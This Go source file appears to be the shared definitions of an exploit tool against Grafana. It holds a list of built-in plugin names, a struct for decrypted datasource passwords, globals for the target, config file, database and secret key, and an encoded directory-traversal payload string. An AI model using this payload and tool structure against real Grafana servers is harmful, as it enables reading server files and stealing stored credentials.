package internal

import "github.com/op/go-logging"

var Logger = logging.MustGetLogger("grafana")
var PluginUrls = []string{"alertlist", "gauge", "graph", "alertmanager", "grafana", "loki", "postgres", "candlestick", "heatmap", "logs", "pluginlist", "table", "welcome", "annolist", "canvas", "geomap", "histogram", "news", "stat", "table-old", "xychart", "barchart", "dashlist", "gettingstarted", "icon", "nodeGraph", "state-timeline", "text"}

type SecureData struct {
	Password      string `json:"password"`
	BasicPassword string `json:"basicAuthPassword"`
}

var Target = ""
var Plugin = ""
var ConfFile = ""
var DBFile = ""
var Key = ""
var OutFile = ""
var LDBFile = ""
var IsNginx = ""
var Payload = "#/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f"
